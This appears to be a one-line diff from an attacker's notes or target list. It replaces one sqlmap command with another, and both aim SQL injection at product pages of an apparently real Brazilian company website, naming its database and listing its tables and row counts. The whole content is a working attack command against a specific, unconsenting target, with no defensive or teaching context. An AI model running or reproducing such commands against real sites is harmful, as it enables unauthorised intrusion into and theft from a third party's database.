@@ -1,1 +1,1 @@
-http://www.embaclass.com.br/single-produto.php?id=17 (GET)  # sqlmap.py -u http://www.embaclass.com.br/single-produto.php?id=17 -D embac012_embaclass --tables --threads 10 -v3
+http://www.embaclass.com.br/produtos.php?linha=1 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.embaclass.com.br/produtos.php?linha=1 -D embac012_embaclass --tables --count
